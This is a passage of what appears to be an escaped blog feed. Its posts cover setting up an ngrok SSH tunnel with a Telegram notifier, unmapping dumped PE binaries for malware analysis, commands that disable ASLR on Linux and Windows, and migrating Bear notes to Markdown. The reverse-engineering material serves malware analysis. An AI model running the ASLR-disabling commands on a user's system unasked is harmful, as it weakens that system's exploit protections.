&lt;li&gt;Create script &lt;code&gt;tsend.py&lt;/code&gt;:&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; sys &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; argv
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; telegram

bot &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; telegram&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Bot(token&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;YOUR_API_KEY&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# FIXME your api key&lt;/span&gt;
chat_id &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1234&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# FIXME YOUR_CHAT_ID&lt;/span&gt;
raw_msg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;replace(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#34;&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;replace(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;tcp://&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# &amp;#34;tcp://0.tcp.ngrok.io:10361&amp;#34;&lt;/span&gt;
ip,port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; raw_msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;)

message &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;ip&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;port&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
bot&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send_message(chat_id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;chat_id, text&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;message)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;7&#34;&gt;
&lt;li&gt;Check if you are able to send message to you from your bot by typing &lt;code&gt;python3 tsend.py hello&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;make-your-service-always-available&#34;&gt;Make your service always available&lt;/h3&gt;
&lt;p&gt;Final step, below script will:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Start ngrok tunnel if it is not running&lt;/li&gt;
&lt;li&gt;Send you actual &lt;code&gt;IP:PORT&lt;/code&gt; thanks to telegram bot&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;Below script is designed to be run from cron, thanks to this solution it will be run automatically i.e every 5 minutes:
&lt;code&gt;*/5 * * * * path/to/monitor.sh&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# monitor.sh&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash&lt;/span&gt;

NGROK&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/usr/local/bin/ngrok&amp;#39;&lt;/span&gt;
DIR&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$HOME&lt;span style=&#34;color:#e6db74&#34;&gt;/ngrok-apps&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# directory containing this script and tsend.py&lt;/span&gt;
URL_DIR&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/tmp/ngrok-url&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# check if it&amp;#39;s working&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; ! &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;pidof ngrok&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
        echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[ngrok] is not working, starting new instance...&amp;#34;&lt;/span&gt;
        $NGROK start sshglob &amp;gt; /dev/null &amp;amp;
        sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# get current status of tunnel&lt;/span&gt;
NEW_STATUS&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;curl -s http://127.0.0.1:4040/api/tunnels | jq &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.tunnels[0] .public_url&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[ngrok] &lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;date&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;$NEW_STATUS&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
OLD_STATUS&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$URL_DIR&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
        OLD_STATUS&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;cat $URL_DIR&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# check if differ&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$NEW_STATUS&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; !&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$OLD_STATUS&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
        echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[ngrok] New status detected! Updating IP&amp;#34;&lt;/span&gt;
        echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$NEW_STATUS&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$URL_DIR&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
        python3 &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$DIR&lt;span style=&#34;color:#e6db74&#34;&gt;/tsend.py&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$NEW_STATUS&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If everything works you should receive notification to your telegram if IP or port will change.&lt;/p&gt;
&lt;h2 id=&#34;troubleshooting&#34;&gt;Troubleshooting&lt;/h2&gt;
&lt;h4 id=&#34;my-ngrok-tunnel-is-started-but-i-cant-access-service&#34;&gt;My ngrok tunnel is started, but I can&amp;rsquo;t access service&lt;/h4&gt;
&lt;p&gt;Is this service running also on localhost? Or can you reach shown ngrok host (IP)?&lt;/p&gt;
&lt;h3 id=&#34;can-i-use-something-else-than-telegram&#34;&gt;Can I use something else than telegram?&lt;/h3&gt;
&lt;p&gt;Yes, but I had already telegram in place. If you need you can use i.e Discord, Slack, mail, etc. (but you need to modify &lt;code&gt;tsend.py&lt;/code&gt; script)&lt;/p&gt;
&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://ngrok.com/&#34;&gt;https://ngrok.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://telegram.org/&#34;&gt;https://telegram.org/&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</content>
    </item>
    
    <item>
      <title>Unmap PE Manually</title>
      <link>/posts/unmap-pe-manually/</link>
      <pubDate>Sat, 25 Jan 2020 09:00:00 +0100</pubDate>
      
      <guid>/posts/unmap-pe-manually/</guid>
      <description>Prerequisities  Make sure that you have dumped binary from memory (optionally) Fix PE headers if necessary  Unmap With PE bear  Open PE-bear &amp;gt; Sections &amp;gt; Section Headers Make sure that VA and VS matches RA and RS, so:  RA[i] = VA[i] RS[i] = RA[i+1] - RA[i] RS.reloc = 0 VS[i] = RS[i]   If you see some red blocks it means that PE is probably misalligned, check: Fix misalligned sections  Fix misalligned sections  Open binary in hex editor Go to the 1st section (on example above to 0x1000) Section should start in this place, nulls should be before.</description>
      <content>&lt;h2 id=&#34;prerequisities&#34;&gt;Prerequisities&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Make sure that you have dumped binary from memory&lt;/li&gt;
&lt;li&gt;(optionally) Fix PE headers if necessary&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;unmap&#34;&gt;Unmap&lt;/h2&gt;
&lt;h3 id=&#34;with-pe-bear&#34;&gt;With PE bear&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Open &lt;em&gt;PE-bear&lt;/em&gt; &amp;gt; &lt;em&gt;Sections&lt;/em&gt; &amp;gt; &lt;em&gt;Section Headers&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Make sure that VA and VS matches RA and RS, so:
&lt;ol&gt;
&lt;li&gt;RA[i] = VA[i]&lt;/li&gt;
&lt;li&gt;RS[i] = RA[i+1] - RA[i]&lt;/li&gt;
&lt;li&gt;RS.reloc = 0&lt;/li&gt;
&lt;li&gt;VS[i] = RS[i]&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;If you see some red blocks it means that PE is probably misalligned, check: &lt;em&gt;Fix misalligned sections&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;/img/unmap-pe.png&#34; alt=&#34;UnmapPE&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;fix-misalligned-sections&#34;&gt;Fix misalligned sections&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;/img/unmap-hex1.png&#34; alt=&#34;Dump1&#34;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Open binary in hex editor&lt;/li&gt;
&lt;li&gt;Go to the 1st section (on example above to &lt;code&gt;0x1000&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Section should start in this place, nulls should be before.&lt;/li&gt;
&lt;li&gt;Append nulls starting from last null seen before 1st section (&lt;code&gt;0xfdf&lt;/code&gt;) to section start address (inconclusive) (&lt;code&gt;0x1000&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Save.&lt;/li&gt;
&lt;li&gt;Review in &lt;em&gt;PE Bear&lt;/em&gt;:
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;Sections&lt;/code&gt; &amp;gt; &lt;code&gt;Section Headers&lt;/code&gt; should no longer be marked as read.&lt;/li&gt;
&lt;li&gt;if &lt;code&gt;Section Headers &lt;/code&gt; &amp;gt; &lt;code&gt;Image Base&lt;/code&gt; is the same as dumped section address (if not, set it to dumped section address).&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;/img/unmap-hex2.png&#34; alt=&#34;Dump2&#34;&gt;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Disable Aslr</title>
      <link>/posts/disable-aslr/</link>
      <pubDate>Sat, 18 Jan 2020 14:00:15 +0100</pubDate>
      
      <guid>/posts/disable-aslr/</guid>
      <description>Linux echo 0 | sudo tee /proc/sys/kernel/randomize_va_space radare2 # disable ASLR &amp;amp; reanalyse dor aslr=no aaa Windows Windows 7  Open RegEdit Goto: HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\ Create new value (not a key): MoveImages with value 0. Reboot.  Windows 10 Disable ASLR per file Set-Processmitigation -Name name.exe -Disable ForceRelocateImages Disable ASLR by default  Search in Windows for: “windows defender Security Center” Click on the second icon from the bottom: “App &amp;amp; browser control” Scroll to the bottom and click on: “Exploit protection settings” Set “Force randomization for images “ to OFF.</description>
      <content>&lt;h2 id=&#34;linux&#34;&gt;Linux&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;echo &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; | sudo tee /proc/sys/kernel/randomize_va_space
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;radare2&#34;&gt;radare2&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-r2&#34; data-lang=&#34;r2&#34;&gt;# disable ASLR &amp;amp; reanalyse
dor aslr=no
aaa
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;windows&#34;&gt;Windows&lt;/h2&gt;
&lt;h3 id=&#34;windows-7&#34;&gt;Windows 7&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Open &lt;code&gt;RegEdit&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Goto: &lt;code&gt;HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Create new &lt;em&gt;value&lt;/em&gt; (not a key): &lt;code&gt;MoveImages&lt;/code&gt; with value &lt;code&gt;0&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Reboot.&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;windows-10&#34;&gt;Windows 10&lt;/h3&gt;
&lt;h4 id=&#34;disable-aslr-per-file&#34;&gt;Disable ASLR per file&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;Set-Processmitigation -Name name.exe -Disable ForceRelocateImages
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;disable-aslr-by-default&#34;&gt;Disable ASLR by default&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;Search in Windows for: “windows defender Security Center”&lt;/li&gt;
&lt;li&gt;Click on the second icon from the bottom: “App &amp;amp; browser control”&lt;/li&gt;
&lt;li&gt;Scroll to the bottom and click on: “Exploit protection settings”&lt;/li&gt;
&lt;li&gt;Set “Force randomization for images “ to &lt;em&gt;OFF&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;Reboot&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;references&#34;&gt;References&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://oalabs.openanalysis.net/2019/06/12/disable-aslr-for-easier-malware-debugging/&#34;&gt;Disable ASLR for Easier Malware Debugging With x64dbg and IDA Pro&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://gist.github.com/trietptm/b84ccad9db01f459ac7e&#34;&gt;Gist&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.reddit.com/r/ReverseEngineering/comments/bzn06z/disable_aslr_for_easier_malware_debugging_with/&#34;&gt;Disable ASLR For Easier Malware Debugging With x64dbg and IDA Pro (OALabs Quick Tip) : ReverseEngineering&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
    <item>
      <title>Keep Your Notes Organized (bear2mdtree demo)</title>
      <link>/posts/keep-your-md-notes-organized/</link>
      <pubDate>Sat, 18 Jan 2020 09:00:00 +0100</pubDate>
      
      <guid>/posts/keep-your-md-notes-organized/</guid>
      <description>Journey of finding ideal note-taking app  TL;DR: If you want to transfer your bear notes to markdown goto Move your bear notes, if you want to emulate Bear multi-tagging check Multitagging support.
 Once upon a time I was using Bear.app for writing and organizing notes. It had really good features like multi-tagging and couple of other nice features like pseudo markdown support. Unfortunatelly a lot of things were bugged, developers slow in fixing them so I decided to move my notes from Bear to other platform.</description>
      <content>&lt;h2 id=&#34;journey-of-finding-ideal-note-taking-app&#34;&gt;Journey of finding ideal note-taking app&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;TL;DR: If you want to transfer your bear notes to markdown goto &lt;a href=&#34;#Moving-bear-notes&#34;&gt;Move your bear notes&lt;/a&gt;, if you want to emulate &lt;em&gt;Bear&lt;/em&gt; multi-tagging check &lt;a href=&#34;#multitagging-support&#34;&gt;Multitagging support&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Once upon a time I was using &lt;a href=&#34;https://bear.app&#34;&gt;Bear.app&lt;/a&gt; for writing and organizing notes. It had really good features like multi-tagging and couple of other nice features like pseudo markdown support. Unfortunatelly a lot of things were bugged, developers slow in fixing them so I decided to move my notes from &lt;em&gt;Bear&lt;/em&gt; to other platform.&lt;/p&gt;
&lt;h3 id=&#34;requirements&#34;&gt;Requirements&lt;/h3&gt;
&lt;p&gt;I wanted to have these features:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;WYSWIG (What You See Is What You Get) editor with only 1 pane,&lt;/li&gt;
&lt;li&gt;Notes should be kept / written in Markdown,&lt;/li&gt;
&lt;li&gt;Support image pasting from clipboard,&lt;/li&gt;
&lt;li&gt;Sync,&lt;/li&gt;
&lt;li&gt;Support for nested tags(1),&lt;/li&gt;
&lt;li&gt;Support for multi-tagging(2).&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;1-nested-tags&#34;&gt;(1) Nested tags&lt;/h4&gt;
&lt;p&gt;We can have tree-like tags, i.e notes assigned to: &lt;code&gt;tag1/sub1&lt;/code&gt;, will be also visible in &lt;code&gt;tag1&lt;/code&gt;, but not in &lt;code&gt;tag2/sub1&lt;/code&gt; (defferent parent).&lt;/p&gt;
&lt;h4 id=&#34;2-multi-tagging&#34;&gt;(2) Multi-tagging&lt;/h4&gt;
&lt;p&gt;Notes can belong to multiple tags, so they should be visible from multiple tag sub-trees.&lt;/p&gt;
&lt;h2 id=&#34;ideal-doesnt-exists-but&#34;&gt;Ideal doesn&amp;rsquo;t exists, but&amp;hellip;&lt;/h2&gt;
&lt;p&gt;Finally I couldn&amp;rsquo;t find ideal substitute for &lt;em&gt;Bear&lt;/em&gt;, so I decided to move into some WYSWIG Markdown editor which will nicely present meta-data for multi-tagging - I will take care about the rest of mine requirements.&lt;/p&gt;
&lt;p&gt;I decided to move to &lt;a href=&#34;https://typora.io/&#34;&gt;Typora&lt;/a&gt; - it is not perfect, but it seems to work fine. Moving to editor based on directory tree (folders = tags) have one big disadvantage - we can&amp;rsquo;t have multiple tags (but nested tags are working nicely). I had idea how to overcome this issue.&lt;/p&gt;
&lt;h3 id=&#34;prerequirements&#34;&gt;Prerequirements&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Clone my repo &lt;a href=&#34;https://github.com/trib0r3/bear2markdowntree&#34;&gt;bear2markdowntree&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Follow step (1) and (2) from &lt;em&gt;How to&lt;/em&gt; section.&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;move-your-bear-notes&#34;&gt;Move your bear notes&lt;/h3&gt;
&lt;p&gt;First of all I created a concept of &amp;ldquo;main tag&amp;rdquo;, so if note have multiple tags (i.e &lt;code&gt;tag1/sub1&lt;/code&gt; and &lt;code&gt;tag2/sub2&lt;/code&gt;) we have to choose which tag is more important to us. The &lt;em&gt;main tag&lt;/em&gt; will be actually translated into directory structure in your notes directory and saved there! The rest of the tags will be added into note as YAML meta-data.&lt;/p&gt;
&lt;p&gt;For example: you have exported &lt;em&gt;bear&lt;/em&gt; note to &lt;code&gt;$BEAR_DIR/note.md&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;# Note

My note

#tag1/sub1 #tag2/sub2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After exporting this note with my script and selecting &lt;code&gt;#tag1/sub1&lt;/code&gt; as main tag, the note will be saved under &lt;code&gt;$NOTES_DIR/tag1/sub1/note.md&lt;/code&gt; and it will look like this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;---
tags: [&amp;#34;tag1/sub1&amp;#34;, &amp;#34;tag2/sub2&amp;#34;]
---
# Note

My note
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;demo&#34;&gt;Demo&lt;/h4&gt;
&lt;p&gt;Before running &lt;code&gt;export-bear2typora.py&lt;/code&gt; don&amp;rsquo;t forget setup script by editing it:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# config dirs&lt;/span&gt;
NOTE_DIR &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Notes/&amp;#34;&lt;/span&gt;         &lt;span style=&#34;color:#75715e&#34;&gt;# output dir&lt;/span&gt;
BEAR_DIR &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;BearNotes/&amp;#34;&lt;/span&gt;     &lt;span style=&#34;color:#75715e&#34;&gt;# input dir&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Paths are relative to script path, during script execution you can be prompted for tag selection. During this you can also jump into python interactive session and fix tag name if something was wrongly matched (minimum knowledge of python is required) - tags are kept in &lt;code&gt;tags&lt;/code&gt; array.&lt;/p&gt;
&lt;p&gt;After this process you should have exported and fixed notes in your &lt;code&gt;BEAR_DIR&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&#34;multitagging-support&#34;&gt;Multitagging support&lt;/h3&gt;
&lt;p&gt;This topic is actually nicely described in &lt;a href=&#34;https://github.com/trib0r3/bear2markdowntree#multi-tagging-support&#34;&gt;README&lt;/a&gt;. We can emulate multi-tags structure by symbolic links (but with some problems on Windows and in Typora) or by creating special file which I called &lt;em&gt;index&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;This file should be (re)generated with &lt;code&gt;build-tags.py&lt;/code&gt; each time you decide to put some new file in your directory list.&lt;/p&gt;
&lt;p&gt;Here you should edit only one variable (if you have &lt;code&gt;NOTES_DIR&lt;/code&gt; relative to home directory):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;HOME_USER &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; str(Path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;home())
NOTES_DIR &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; HOME_USER &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/Dropbox/Notes/&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# FIXME:  add path to your Notes folder (relative to $HOME)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If you want to use absoulte path change code to:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;NOTES_DIR &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/root/home/notes/&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Additionally if you don&amp;rsquo;t want to see some tags, you can add them here:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# If you want ignore some tags in the final listing add them to this list&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# WARNING: this feature is actually taking only subtag, &lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#  Ex#1: you have note with tag: &amp;#34;dev/python/code-snippets&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    if you decide to ignore tag &amp;#34;dev&amp;#34;, then all subtags (&amp;#34;python&amp;#34;, &amp;#34;code-snippets&amp;#34;)  will be also ignored!&lt;/span&gt;
